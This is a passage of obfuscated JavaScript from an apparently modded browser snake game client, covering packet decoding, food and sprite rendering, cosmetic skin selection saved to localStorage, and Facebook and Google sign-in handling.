            _0x5bbb2b += 2;
            var _0x152fe2 = _0x440d1c.ea(_0x5bbb2b);
            _0x5bbb2b += 4;
            _0x457997.Ch.push(_0x1c97c7.Pi.Qi(_0x4ecce7, _0x152fe2));
          }
          _0x457997.zh = [];
          if (this.dh.hh.xg === _0x1c97c7.Ac.zc) {
            for (var _0x9d35d7 = _0x440d1c.ba(_0x5bbb2b++), _0xf8b3d5 = 0; _0xf8b3d5 < _0x9d35d7; _0xf8b3d5++) {
              var _0x4ba92a = _0x440d1c.ba(_0x5bbb2b);
              _0x5bbb2b += 1;
              var _0xc0fdcb = _0x440d1c.ea(_0x5bbb2b);
              _0x5bbb2b += 4;
              _0x457997.zh.push(_0x1c97c7.Pi.Ri(_0x4ba92a, _0xc0fdcb));
            }
          }
          _0xf1d21a().og.af.ng.Vg.Uf(_0x457997);
        };
        _0x2c7a2e.prototype.vi = function (_0x3597e3) {
          if (_0x3597e3 === this.dh.hh.yg) {
            return this.dh.ch;
          } else {
            return this.dh.Fh[_0x3597e3];
          }
        };
        _0x2c7a2e.prototype.Ai = function (_0x3d9411, _0x2b9679, _0x25aa0e) {
          return (((_0x25aa0e & 255 | _0x2b9679 << 8 & 65280 | _0x3d9411 << 16 & 16711680) & 16777215) / 8388608 - 1) * 10000;
        };
        _0x2c7a2e.prototype.Ji = function (_0x2b63cd) {
          return ((_0x2b63cd & 65535) / 32768 - 1) * this.dh.hh.Dg();
        };
        _0x2c7a2e.prototype.Ki = function (_0x5b82a2) {
          return ((_0x5b82a2 >> 16 & 65535) / 32768 - 1) * this.dh.hh.Dg();
        };
        _0x2c7a2e.prototype._h = function (_0x48c052, _0x1f1327) {
          var _0x2bca23 = _0x48c052.ba(_0x1f1327);
          if ((_0x2bca23 & 128) == 0) {
            return _0x2bca23;
          }
          var _0x14b925 = _0x48c052.ba(_0x1f1327 + 1);
          if ((_0x14b925 & 128) == 0) {
            return _0x14b925 | _0x2bca23 << 7 & 16256;
          }
          var _0x8b3c4d = _0x48c052.ba(_0x1f1327 + 2);
          if ((_0x8b3c4d & 128) == 0) {
            return _0x8b3c4d | _0x14b925 << 7 & 16256 | _0x2bca23 << 14 & 2080768;
          }
          var _0x37a9b8 = _0x48c052.ba(_0x1f1327 + 3);
          if ((_0x37a9b8 & 128) == 0) {
            return _0x37a9b8 | _0x8b3c4d << 7 & 16256 | _0x14b925 << 14 & 2080768 | _0x2bca23 << 21 & 266338304;
          } else {
            return undefined;
          }
        };
        _0x2c7a2e.prototype.ai = function (_0x14af01) {
          if (_0x14af01 < 128) {
            return 1;
          } else if (_0x14af01 < 16384) {
            return 2;
          } else if (_0x14af01 < 2097152) {
            return 3;
          } else if (_0x14af01 < 268435456) {
            return 4;
          } else {
            return undefined;
          }
        };
        return _0x2c7a2e;
      }();
      _0x1c97c7.Si = function () {
        function _0x8d255c(_0x3cf986) {
          this.Ti = _0x3cf986;
        }
        _0x8d255c.Ui = function () {
          return new _0x1c97c7.Si(null);
        };
        _0x8d255c.Vi = function (_0xd9dc4f) {
          return new _0x1c97c7.Si(_0xd9dc4f);
        };
        _0x8d255c.prototype.bc = function () {
          return this.Ti;
        };
        _0x8d255c.prototype.Wi = function () {
          return this.Ti != null;
        };
        _0x8d255c.prototype.Xi = function (_0x494af8) {
          if (this.Ti != null) {
            _0x494af8(this.Ti);
          }
        };
        return _0x8d255c;
      }();
      _0x1c97c7.Fi = function () {
        function _0x1f8b85(_0x1ed914, _0x11aab5) {
          this.Eh = _0x1ed914;
          this.Yi = _0x1ed914.Hh >= 80;
          this.Zi = 0;
          this.$i = 0;
          this._i = 0;
          this.aj = 0;
          this.Mi = this.Yi ? 1 : _0x1ed914.Gi;
          this.Li = 1;
          this.Ni = false;
          this.bj = 0;
          this.cj = 0;
          this.dj = 1;
          this.ej = Math.random() * 6.283185307179586;
          this.fj = new _0x1c97c7.PortionSpriteTree();
          this.fj.yc(_0xf1d21a().dh.hh.xg, this.Eh.Gh === _0x1c97c7.GameParams.Cg ? null : _0xf1d21a().Lc.Ub().jb(this.Eh.Gh), _0xf1d21a().Lc.Ub().ob(this.Eh.Hh));
          _0x11aab5.mh(_0x1ed914.ae, this.fj);
        }
        _0x1f8b85.prototype.si = function () {
          this.fj.nh.Dc.Rc();
          this.fj.nh.Cc.Rc();
          this.fj.nh.Dc.xc.width = 100;
          this.fj.nh.Dc.xc.height = 100;
        };
        _0x1f8b85.prototype.Ii = function (_0x5903e6, _0x10521a, _0x1db09c) {
          this.Zi = _0x5903e6;
          this.$i = _0x10521a;
          if (_0x1db09c) {
            this._i = _0x5903e6;
            this.aj = _0x10521a;
          }
        };
        _0x1f8b85.prototype.hj = function (_0x12c3a5, _0x592f38) {
          var _0x3dc027 = Math.min(0.5, this.Mi * 1);
          var _0x4abfa7 = Math.min(2.5, this.Mi * 1.5);
          this.bj = _0x503ed4.Q(this.bj, _0x3dc027, _0x592f38, 0.0025);
          this.cj = _0x503ed4.Q(this.cj, _0x4abfa7, _0x592f38, 0.0025);
          this.dj = _0x503ed4.Q(this.dj, this.Li, _0x592f38, 0.0025);
        };
        _0x1f8b85.prototype.ij = function (_0x450650, _0x40d83c, _0x5654a9) {
          this._i = _0x503ed4.Q(this._i, this.Zi, _0x40d83c, window.vps.eat_animation);
          this.aj = _0x503ed4.Q(this.aj, this.$i, _0x40d83c, 0.0025);
          this.fj.Uf(this, _0x450650, _0x40d83c, _0x5654a9);
        };
        _0x1f8b85.li = function () {
          function _0x2a67f6() {
            this.me = 0;
            this.ae = 0;
            this.Gh = _0x498743.ps ? _0x498743.ps : _0x1c97c7.GameParams.Cg;
            this.Gi = 0;
            this.Hh = 0;
          }
          return _0x2a67f6;
        }();
        return _0x1f8b85;
      }();
      _0x1c97c7.PortionSpriteTree = function () {
        var _0xf1d288 = 500;
        var _0x4cef9d = 100;
        function _0x5b15de() {
          this.nh = new _0x3a8fc0(new _0x1c97c7.sc(), new _0x1c97c7.sc());
          this.nh.Dc.xc.blendMode = _0x32defb.v.z;
          this.nh.Dc.xc.zIndex = _0x4cef9d;
          this.nh.Cc.xc.zIndex = _0xf1d288;
        }
        _0x5b15de.prototype.yc = function (_0x2fbcb1, _0x468ea2, _0x3697f3) {
          var _0x3b4ed2 = _0x3697f3.ub;
          if (_0x3b4ed2) {
            this.nh.Cc.Bc(_0x3b4ed2);
          }
          var _0x7bf8c5 = _0x2fbcb1 === _0x1c97c7.Ac.zc && _0x468ea2 ? _0x468ea2.sb.vb : _0x3697f3.vb;
          if (_0x7bf8c5) {
            this.nh.Dc.Bc(_0x7bf8c5);
          }
        };
        _0x5b15de.prototype.Uf = function (_0x1346fe, _0x1f9fa3, _0x531681, _0x36f481) {
          if (!_0x36f481(_0x1346fe._i, _0x1346fe.aj)) {
            this.nh.Uc();
          } else {
            var _0x2fc4c7 = _0x15b497 > 1 ? _0x15b497 / 5 : 0;
            var _0x427a85 = _0x1346fe.cj * 1 + Math.cos(_0x1346fe.ej + _0x1f9fa3 / 200) * 0.3;
            if (_0x1346fe.Yi) {
              this.nh.Sc(_0x1346fe._i, _0x1346fe.aj, _0x1346fe.bj * 2 * window.vps.PortionSize + _0x2fc4c7, _0x1346fe.dj * 1 * window.vps.PortionSize + _0x2fc4c7, _0x427a85 * 1.2 * window.vps.PortionAura + _0x2fc4c7, _0x1346fe.dj * window.vps.PortionTransparent);
            } else {
              this.nh.Sc(_0x1346fe._i, _0x1346fe.aj, _0x1346fe.bj * 2 * window.vps.FoodSize, _0x1346fe.dj * 1 * window.vps.FoodSize, _0x427a85 * 2 * window.vps.FoodShadow, _0x1346fe.dj * window.vps.FoodTransparent);
            }
          }
        };
        var _0x3a8fc0 = function () {
          function _0xbb9c34(_0x6eb840, _0x2398ce) {
            this.Cc = _0x6eb840;
            this.Dc = _0x2398ce;
          }
          _0xbb9c34.prototype.Sc = function (_0x301153, _0x3d8d26, _0x166bba, _0x5e383b, _0x914d83, _0x292fb3) {
            this.Cc.kd(true);
            this.Cc.ld(_0x301153, _0x3d8d26);
            this.Cc.Tc(_0x166bba);
            this.Cc.jj(_0x5e383b);
            this.Dc.kd(true);
            this.Dc.ld(_0x301153, _0x3d8d26);
            this.Dc.Tc(_0x914d83);
            this.Dc.jj(_0x292fb3);
          };
          _0xbb9c34.prototype.Uc = function () {};
          return _0xbb9c34;
        }();
        return _0x5b15de;
      }();
      _0x1c97c7.kj = function () {
        function _0xdebb90() {
          this.lj = 0;
          this.mj = 0;
          this.nj = 0;
          this.oj = 0;
          this.pj = 0;
          this.qj = [];
        }
        function _0x3aea52(_0x1f68fc, _0x8db2b3) {
          for (var _0x5accde = 0; _0x5accde < _0x1f68fc.length; _0x5accde++) {
            if (_0x1f68fc[_0x5accde].id == _0x8db2b3) {
              return _0x5accde;
            }
          }
          return -1;
        }
        _0xdebb90.prototype.ha = function () {};
        _0xdebb90.prototype.rj = function (_0x421c16) {
          if (!window.vps.loading) {
            window.vps.PropertyManager = _0x3346cc({}, this);
            window.vps.a = this.lj;
            window.vps.b = this.mj;
            window.vps.c = this.nj;
            window.vps.d = this.pj;
            window.vps.e = this.oj;
            localStorage.setItem("SaveGamewup", JSON.stringify(vps));
            const _0x72b8 = JSON.parse(localStorage.getItem("SaveGameup") || "{}");
            _0x72b8.a = this.lj;
            _0x72b8.b = this.mj;
            _0x72b8.c = this.nj;
            _0x72b8.d = this.pj;
            _0x72b8.e = this.oj;
            localStorage.setItem("SaveGameup", JSON.stringify(_0x72b8));
          }
          switch (_0x421c16) {
            case _0x1c97c7.tj.sj:
              return this.lj;
            case _0x1c97c7.tj.uj:
              return this.mj;
            case _0x1c97c7.tj.vj:
              return this.nj;
            case _0x1c97c7.tj.wj:
              return this.oj;
            case _0x1c97c7.tj.xj:
              return this.pj;
          }
          return 0;
        };
        _0xdebb90.prototype.yj = function () {
          return new _0x1c97c7.hb(this.lj, this.mj, this.nj, this.oj, this.pj);
        };
        _0xdebb90.prototype.zj = function (_0x29948c) {
          this.qj.push(_0x29948c);
          this.Aj();
        };
        _0xdebb90.prototype.Bj = function () {
          if (!_0xf1d21a().Lc.Wb()) {
            return _0x503ed4.W([32, 33, 34, 35]);
          }
          var _0x3fefbb = [];
          for (var _0x59204b = _0xf1d21a().Lc.Xb().skinArrayDict, _0x54ed7c = 0; _0x54ed7c < _0x59204b.length; _0x54ed7c++) {
            var _0x6e4e62 = _0x59204b[_0x54ed7c];
            if (this.Cj(_0x6e4e62.id, _0x1c97c7.tj.sj)) {
              _0x3fefbb.push(_0x6e4e62);
            }
          }
          if (_0x3fefbb.length === 0) {
            return 0;
          } else {
            return _0x3fefbb[parseInt(_0x3fefbb.length * Math.random())].id;
          }
        };
        _0xdebb90.prototype.Dj = function () {
          if (_0xf1d21a().Lc.Wb()) {
            var _0x194574 = _0xf1d21a().Lc.Xb().skinArrayDict;
            var _0x52e380 = _0x3aea52(_0x194574, this.lj);
            if (!(_0x52e380 < 0)) {
              for (var _0x59c49f = _0x52e380 + 1; _0x59c49f < _0x194574.length; _0x59c49f++) {
                if (this.Cj(_0x194574[_0x59c49f].id, _0x1c97c7.tj.sj)) {
                  this.lj = _0x194574[_0x59c49f].id;
                  this.Aj();
                  return;
                }
              }
              for (var _0x1fb49e = 0; _0x1fb49e < _0x52e380; _0x1fb49e++) {
                if (this.Cj(_0x194574[_0x1fb49e].id, _0x1c97c7.tj.sj)) {
                  this.lj = _0x194574[_0x1fb49e].id;
                  this.Aj();
                  return;
                }
              }
            }
          }
        };
        _0xdebb90.prototype.Ej = function () {
          var _0x45f033 = _0xf1d21a();
          if (_0x45f033.Lc.Wb) {
            var _0x2ddfe0 = _0x45f033.Lc.Xb().skinArrayDict;
            var _0x2e1658 = _0x3aea52(_0x2ddfe0, this.lj);
            if (!(_0x2e1658 < 0)) {
              for (var _0x60d1fc = _0x2e1658 - 1; _0x60d1fc >= 0; _0x60d1fc--) {
                if (this.Cj(_0x2ddfe0[_0x60d1fc].id, _0x1c97c7.tj.sj)) {
                  this.lj = _0x2ddfe0[_0x60d1fc].id;
                  this.Aj();
                  return;
                }
              }
              for (var _0x5693fa = _0x2ddfe0.length - 1; _0x5693fa > _0x2e1658; _0x5693fa--) {
                if (this.Cj(_0x2ddfe0[_0x5693fa].id, _0x1c97c7.tj.sj)) {
                  this.lj = _0x2ddfe0[_0x5693fa].id;
                  this.Aj();
                  return;
                }
              }
            }
          }
        };
        _0xdebb90.prototype.Fj = function (_0x2d33b8, _0x2fec81) {
          if (!_0xf1d21a().Lc.Wb() || this.Cj(_0x2d33b8, _0x2fec81)) {
            switch (_0x2fec81) {
              case _0x1c97c7.tj.sj:
                if (this.lj !== _0x2d33b8) {
                  this.lj = _0x2d33b8;
                  this.Aj();
                }
                return;
              case _0x1c97c7.tj.uj:
                if (this.mj !== _0x2d33b8) {
                  this.mj = _0x2d33b8;
                  this.Aj();
                }
                return;
              case _0x1c97c7.tj.vj:
                if (this.nj !== _0x2d33b8) {
                  this.nj = _0x2d33b8;
                  this.Aj();
                }
                return;
              case _0x1c97c7.tj.wj:
                if (this.oj !== _0x2d33b8) {
                  this.oj = _0x2d33b8;
                  this.Aj();
                }
                return;
              case _0x1c97c7.tj.xj:
                if (this.pj !== _0x2d33b8) {
                  this.pj = _0x2d33b8;
                  this.Aj();
                }
                return;
            }
          }
        };
        _0xdebb90.prototype.Cj = function (_0x4a7365, _0xd74a40) {
          var _0x4b1e48 = this.Gj(_0x4a7365, _0xd74a40);
          return _0x4b1e48 != null && (_0xf1d21a().Ij.Hj() ? _0x4b1e48.Jj() === 0 && !_0x4b1e48.Kj() || _0xf1d21a().Ij.Lj(_0x4a7365, _0xd74a40) : _0x4b1e48.Mj());
        };
        _0xdebb90.prototype.Gj = function (_0x58c033, _0x51fd13) {
          if (!_0xf1d21a().Lc.Wb()) {
            return null;
          }
          var _0x3b2f0b = _0xf1d21a().Lc.Xb();
          if (_0x51fd13 === _0x1c97c7.tj.sj) {
            var _0x325194 = _0x3aea52(_0x3b2f0b.skinArrayDict, _0x58c033);
            if (_0x325194 < 0) {
              return null;
            } else {
              return _0x1c97c7.Oj.Nj(_0x3b2f0b.skinArrayDict[_0x325194]);
            }
          }
          var _0x4b42b5 = null;
          switch (_0x51fd13) {
            case _0x1c97c7.tj.uj:
              _0x4b42b5 = _0x3b2f0b.eyesDict[_0x58c033];
              break;
            case _0x1c97c7.tj.vj:
              _0x4b42b5 = _0x3b2f0b.mouthDict[_0x58c033];
              break;
            case _0x1c97c7.tj.wj:
              _0x4b42b5 = _0x3b2f0b.hatDict[_0x58c033];
              break;
            case _0x1c97c7.tj.xj:
              _0x4b42b5 = _0x3b2f0b.glassesDict[_0x58c033];
          }
          if (_0x4b42b5 != null) {
            return _0x1c97c7.Oj.Pj(_0x4b42b5);
          } else {
            return null;
          }
        };
        _0xdebb90.prototype.Aj = function () {
          for (var _0x47d9b0 = 0; _0x47d9b0 < this.qj.length; _0x47d9b0++) {
            this.qj[_0x47d9b0]();
          }
        };
        return _0xdebb90;
      }();
      _0x1c97c7.tj = function () {
        function _0x1387eb() {}
        _0x1387eb.sj = "SKIN";
        _0x1387eb.uj = "EYES";
        _0x1387eb.vj = "MOUTH";
        _0x1387eb.xj = "GLASSES";
        _0x1387eb.wj = "HAT";
        return _0x1387eb;
      }();
      _0x1c97c7.Qj = function () {
        function _0x4fd8e7() {
          this.Bf = new _0x32defb.Texture(_0x32defb.BaseTexture.from("/images/bg-obstacle.png"));
          this.Cf = new Array(36);
          this._g = _0x498743.bgg();
          this.ah = new _0x32defb.Texture(function () {
            var _0x5850b0 = _0x32defb.BaseTexture.from("/images/bg-pattern-pow2-TEAM2.png");
            _0x5850b0.wrapMode = _0x32defb.C.D;
            return _0x5850b0;
          }());
          this.Zg = new _0x32defb.Texture(_0x32defb.BaseTexture.from("/images/lens.png"));
          this.rf = null;
          this.Db = function () {
            var _0x248422 = window.document.createElement("canvas");
            _0x248422.width = 80;
            _0x248422.height = 80;
            return {
              Eb: _0x248422,
              Fb: _0x248422.getContext("2d"),
              oa: new _0x32defb.Texture(_0x32defb.BaseTexture.from(_0x248422))
            };
          }();
          this.Ae = {};
          this.we = {};
          this.Rj = [];
          this.Sj = null;
        }
        _0x4fd8e7.prototype.ha = function (_0x1edc0f) {
          function _0x46f832() {
            if (--_0x1563be == 0) {
              _0x1edc0f();
            }
          }
          var _0x1563be = 4;
          this.Ae = {};
          _0x46f832();
          this.we = {};
          _0x46f832();
          this.Rj = [];
          _0x46f832();
          this.Sj = null;
          _0x46f832();
        };
        return _0x4fd8e7;
      }();
      _0x1c97c7.Tj = function () {
        function _0x3e598b() {
          this.Uj = null;
          this.af = new _0x1c97c7.Vj();
          this._e = new _0x1c97c7.Wj();
          this.Xj = new _0x1c97c7.Yj();
          this.Zj = new _0x1c97c7.$j();
          this._j = new _0x1c97c7.ak();
          this.bk = new _0x1c97c7.ck();
          this.dk = new _0x1c97c7.ek();
          this.fk = new _0x1c97c7.gk();
          this.$h = new _0x1c97c7.hk();
          this.ik = new _0x1c97c7.jk();
          this.kk = new _0x1c97c7.lk();
          this.mk = new _0x1c97c7.nk();
          this.ok = new _0x1c97c7.pk();
          this.qk = new _0x1c97c7.rk();
          this.ie = new _0x1c97c7.sk();
          this.tk = new _0x1c97c7.uk();
          this.vk = new _0x1c97c7.wk();
          this.xk = new _0x1c97c7.yk();
          this.zk = [];
        }
        function _0x3f5763(_0x2dcb5b, _0x315e85) {
          if (_0x315e85 !== 0) {
            var _0x4438b8 = _0x2dcb5b[_0x315e85];
            _0x503ed4.T(_0x2dcb5b, 0, 1, _0x315e85);
            _0x2dcb5b[0] = _0x4438b8;
          }
        }
        function _0xd59773(_0x447e4e, _0x5e5664) {
          if (_0x5e5664 !== _0x447e4e.length + 1) {
            var _0x338251 = _0x447e4e[_0x5e5664];
            _0x503ed4.T(_0x447e4e, _0x5e5664 + 1, _0x5e5664, _0x447e4e.length - _0x5e5664 - 1);
            _0x447e4e[_0x447e4e.length - 1] = _0x338251;
          }
        }
        function _0x387521(_0x18d1ed, _0x11542c) {
          for (var _0x3d94fe = 0; _0x3d94fe < _0x18d1ed.length; _0x3d94fe++) {
            if (_0x18d1ed[_0x3d94fe] === _0x11542c) {
              return _0x3d94fe;
            }
          }
          return -1;
        }
        _0x3e598b.prototype.ha = function () {
          this.Uj = null;
          this.zk = [this.af, this._e, this.Xj, this.Zj, this._j, this.bk, this.dk, this.fk, this.$h, this.ik, this.kk, this.mk, this.ok, this.qk, this.ie, this.tk, this.vk, this.xk];
          for (var _0xbf2c78 = 0; _0xbf2c78 < this.zk.length; _0xbf2c78++) {
            this.zk[_0xbf2c78].ha();
          }
        };
        _0x3e598b.prototype.lh = function (_0xed5fe8, _0x294284) {
          for (var _0x17ba83 = this.zk.length - 1; _0x17ba83 >= 0; _0x17ba83--) {
            this.zk[_0x17ba83].Nf(_0xed5fe8, _0x294284);
          }
          if (this.zk[0] !== this.af && this.zk[0] !== this.xk && this.Uj != null) {
            this.Uj.Nf(_0xed5fe8, _0x294284);
          }
        };
        _0x3e598b.prototype.Jf = function () {
          for (var _0x46e864 = this.zk.length - 1; _0x46e864 >= 0; _0x46e864--) {
            this.zk[_0x46e864].Jf();
          }
          if (this.Uj != null) {
            this.Uj.Jf();
          }
        };
        _0x3e598b.prototype.Ak = function (_0x4e63cb) {
          var _0x551edb = _0x387521(this.zk, _0x4e63cb);
          if (!(_0x551edb < 0)) {
            this.zk[0].Bk();
            _0x3f5763(this.zk, _0x551edb);
            this.Ck();
          }
        };
        _0x3e598b.prototype.Dk = function () {
          this.zk[0].Bk();
          do {
            _0xd59773(this.zk, 0);
          } while (this.zk[0].nd !== _0x1c97c7.Fk.Ek);
          this.Ck();
        };
        _0x3e598b.prototype.Ck = function () {
          var _0x4fdba3 = this.zk[0];
          _0x4fdba3.Gk();
          _0x4fdba3.Hk();
          this.Ik();
        };
        _0x3e598b.prototype.Jk = function () {
          return this.zk.length !== 0 && this.zk[0].nd === _0x1c97c7.Fk.Ek && this.qk.Kk();
        };
        _0x3e598b.prototype.Lk = function () {
          if (this.zk.length === 0) {
            return null;
          } else {
            return this.zk[0];
          }
        };
        _0x3e598b.prototype.Ik = function () {
          if (this.Jk()) {
            this.Ak(this.qk);
          }
        };
        return _0x3e598b;
      }();
      _0x1c97c7.Pi = function () {
        function _0x30f87a() {
          this.Ch = [];
          this.zh = [];
        }
        _0x30f87a.Qi = function (_0x4f92c0, _0x13cd0e) {
          return {
            Dh: _0x4f92c0,
            Bh: _0x13cd0e
          };
        };
        _0x30f87a.Ri = function (_0x5f3093, _0x4a83d3) {
          return {
            Ah: _0x5f3093,
            Bh: _0x4a83d3
          };
        };
        return _0x30f87a;
      }();
      _0x1c97c7.Mk = function () {
        function _0x34fad6() {
          this.setNk = new WeakSet();
          this.Nk = [];
          this.Ok = [];
          this.Pk = false;
          this.Qk = _0x392fa5;
          this.Rk = {};
        }
        var _0x392fa5 = "guest";
        _0x34fad6.Sk = new (function () {
          function _0x29a5e7() {}
          _0x29a5e7.Tk = function () {
            function _0x2794f8(_0xfaa2) {
              this.Uk = _0xfaa2;
            }
            return _0x2794f8;
          }();
          _0x29a5e7.prototype.Vk = function () {
            return typeof FB != "undefined";
          };
          _0x29a5e7.prototype.Wk = function (_0x2a2713, _0x1fb5d, _0x58caa7) {
            var _0x593d93 = "https://graph.facebook.com/me?access_token=" + _0x2a2713;
            $.get(_0x593d93).fail(function () {
              _0x1fb5d();
            }).done(function () {
              _0x58caa7();
            });
          };
          _0x29a5e7.prototype.Xk = function (_0x24498f, _0x2e77db) {
            if (!this.Vk()) {
              _0x24498f();
              return;
            }
            this.Yk(function () {
              FB.login(function (_0x5eb3ac) {
                if (_0x5eb3ac.status !== "connected") {
                  _0x24498f();
                  return;
                }
                var _0x121a53 = _0x5eb3ac.authResponse.accessToken;
                _0x2e77db(new _0x29a5e7.Tk(_0x121a53));
              });
            }, function (_0x44091a) {
              _0x2e77db(_0x44091a);
            });
          };
          _0x29a5e7.prototype.Yk = function (_0x26198b, _0x1c6359) {
            var _0x2e2625 = this;
            if (!this.Vk()) {
              _0x26198b();
              return;
            }
            FB.getLoginStatus(function (_0x54ae95) {
              if (_0x54ae95.status !== "connected") {
                _0x26198b();
                return;
              }
              var _0xd449fe = _0x54ae95.authResponse.accessToken;
              _0x2e2625.Wk(_0xd449fe, function () {
                _0x26198b();
              }, function () {
                _0x1c6359(new _0x29a5e7.Tk(_0xd449fe));
              });
            });
          };
          _0x29a5e7.prototype.Zk = function () {
            if (this.Vk()) {
              FB.logout();
            }
          };
          return _0x29a5e7;
        }())();
        _0x34fad6.$k = new (function () {
          function _0x9a7ef7() {}
          _0x9a7ef7._k = function () {
            function _0x209441(_0x570830, _0x4c500d) {
              this.Uk = _0x570830;
              this.al = _0x4c500d;
            }
            return _0x209441;
          }();
          _0x9a7ef7.prototype.Vk = function () {
            return typeof _0x39075e !== "undefined";
          };
          _0x9a7ef7.prototype.Xk = function (_0x5ac9dd, _0x246680) {
            if (typeof _0x39075e === "undefined") {
              _0x5ac9dd();
              return;
            }
            if (_0x39075e === undefined) {
              _0x5ac9dd();
              return;
            }
            _0x39075e.then(function () {
              if (_0x39075e.isSignedIn.get()) {
                var _0x338d62 = _0x39075e.currentUser.get();
                var _0x167d6d = _0x338d62.getAuthResponse().id_token;
                var _0x2b1455 = new Date().getTime() + _0x338d62.getAuthResponse().expires_in * 1000;
                if (new Date().getTime() < _0x2b1455) {
                  _0x246680(new _0x9a7ef7._k(_0x167d6d, _0x2b1455));
                  return;
                }
              }
              _0x39075e.signIn().then(function (_0x26355c) {
                if (typeof _0x26355c.error !== "undefined") {
                  _0x5ac9dd();
                  return;
                }
                if (!_0x26355c.isSignedIn()) {
                  _0x5ac9dd();
                  return;
                }
                var _0x212f44 = _0x26355c.getAuthResponse().id_token;
                var _0x9811b0 = new Date().getTime() + _0x26355c.getAuthResponse().expires_in * 1000;
                _0x246680(new _0x9a7ef7._k(_0x212f44, _0x9811b0));
              });
            });
          };
          _0x9a7ef7.prototype.Yk = function (_0x502649, _0x89a3ee) {
            if (_0x39075e === undefined) {
              _0x502649();
              return;
            }
            _0x39075e.then(function () {
              if (_0x39075e.isSignedIn.get()) {
                var _0x124ae0 = _0x39075e.currentUser.get();
                var _0x289418 = _0x124ae0.getAuthResponse().id_token;
                var _0x42c3c6 = new Date().getTime() + _0x124ae0.getAuthResponse().expires_in * 1000;
                if (new Date().getTime() < _0x42c3c6) {
                  _0x89a3ee(new _0x9a7ef7._k(_0x289418, _0x42c3c6));
                  return;
                }
              }
              _0x502649();
            });
          };
          _0x9a7ef7.prototype.Zk = function () {
            if (_0x39075e !== undefined) {
              _0x39075e.signOut();
            }
          };
          return _0x9a7ef7;
        }())();
        _0x34fad6.prototype.ha = function () {
          this.bl();
        };
        _0x34fad6.prototype.cl = function () {
          if (this.Pk) {
            return this.Rk.userId;
          } else {
            return "";
          }
        };
        _0x34fad6.prototype.dl = function () {
          if (this.Pk) {
            return this.Rk.username;
          } else {
            return "";
          }
        };
        _0x34fad6.prototype.el = function () {
          if (this.Pk) {
            return this.Rk.nickname.substring(0, _0x178144);
          } else {
            return "";
          }
        };
        _0x34fad6.prototype.fl = function () {
          if (this.Pk) {
            return this.Rk.avatarUrl;
          } else {
            return GUEST_AVATAR_URL;
          }
        };
        _0x34fad6.prototype.gl = function () {
          return this.Pk && this.Rk.isBuyer;
        };
        _0x34fad6.prototype.hl = function () {
          return this.Pk && this.Rk.isConsentGiven;
        };
        _0x34fad6.prototype.il = function () {
          if (this.Pk) {
            return this.Rk.coins;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.jl = function () {
          if (this.Pk) {
            return this.Rk.level;
          } else {
            return 1;
          }
        };
        _0x34fad6.prototype.kl = function () {
          if (this.Pk) {
            return this.Rk.expOnLevel;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.ll = function () {
          if (this.Pk) {
            return this.Rk.expToNext;
          } else {
            return 50;
          }
        };
        _0x34fad6.prototype.ml = function () {
          if (this.Pk) {
            return this.Rk.skinId;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.nl = function () {
          if (this.Pk) {
            return this.Rk.eyesId;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.ol = function () {
          if (this.Pk) {
            return this.Rk.mouthId;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.pl = function () {
          if (this.Pk) {
            return this.Rk.glassesId;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.ql = function () {
          if (this.Pk) {
            return this.Rk.hatId;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.rl = function () {
          if (this.Pk) {
            return this.Rk.highScore;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.sl = function () {
          if (this.Pk) {
            return this.Rk.bestSurvivalTimeSec;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.tl = function () {
          if (this.Pk) {
            return this.Rk.kills;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.ul = function () {
          if (this.Pk) {
            return this.Rk.headShots;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.vl = function () {
          if (this.Pk) {
            return this.Rk.sessionsPlayed;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.wl = function () {
          if (this.Pk) {
            return this.Rk.totalPlayTimeSec;
          } else {
            return 0;
          }
        };
        _0x34fad6.prototype.xl = function () {
          if (this.Pk) {
            return this.Rk.regDate;
          } else {
            return {};
          }
        };
        _0x34fad6.prototype.yl = function (_0x368f90) {
          this.Nk.push(_0x368f90);
          _0x368f90();
        };
        _0x34fad6.prototype.zl = function (_0x349e99) {
          this.Ok.push(_0x349e99);
          _0x349e99();
        };
        _0x34fad6.prototype.Lj = function (_0x485f3a, _0x542ca4) {
          var _0x5ea108 = this.Rk.propertyList;
          if (_0x5ea108 == null) {
            return false;
          }
          var _0x391bdb = _0x485f3a.toString();
          for (var _0x26fae2 = 0; _0x26fae2 < _0x5ea108.length; _0x26fae2++) {
            var _0x3ab39c = _0x5ea108[_0x26fae2];
            if (_0x3ab39c.id === _0x391bdb && _0x3ab39c.type === _0x542ca4) {
              return true;
            }
          }
          return false;
        };
        _0x34fad6.prototype.Hj = function () {
          return this.Pk;
        };
        _0x34fad6.prototype.Al = function () {
          return this.Qk;
        };
        _0x34fad6.prototype.Bl = function (_0x5931ee) {
          var _0x4a1aca = this;
          var _0x92f64e = this.cl();
          var _0xe28638 = this.il();
          var _0x32d0cc = this.jl();
          this.Cl(function () {
            if (_0x5931ee != null) {
              _0x5931ee();
            }
          }, function (_0x249f9c) {
            _0x353f60(_0x249f9c.user_data);
            _0x4a1aca.Rk = _0x249f9c.user_data;
            _0x4a1aca.Dl();
            _0x4a1aca.Rk.isConsentGiven = true;
            var _0x1899c9 = _0x4a1aca.cl();
            var _0x53230e = _0x4a1aca.il();
            var _0x517117 = _0x4a1aca.jl();
            if (_0x92f64e === _0x1899c9) {
              if (_0x517117 > 1 && _0x517117 !== _0x32d0cc) {
                _0xf1d21a().og.qk.El(new _0x1c97c7.Fl(currLevel));
              }
              var _0x3714bc = _0x53230e - _0xe28638;
              if (_0x3714bc >= 20) {
                _0xf1d21a().og.qk.El(new _0x1c97c7.Gl(_0x3714bc));
              }
            }
            if (_0x5931ee != null) {
              _0x5931ee();
            }
          });
        };
        _0x34fad6.prototype.Cl = function (_0x44d24b, _0x2f3ae6) {
          var _0x1967df = _0x503ed4.a.b + "/pub/wuid/" + this.Qk + "/getUserData";
          vps.wuid = this.Qk;
          _0x503ed4.Z(_0x1967df, _0x44d24b, function (_0x225e18) {
            if (_0x225e18.code !== 1200) {
              _0x44d24b();
            } else {
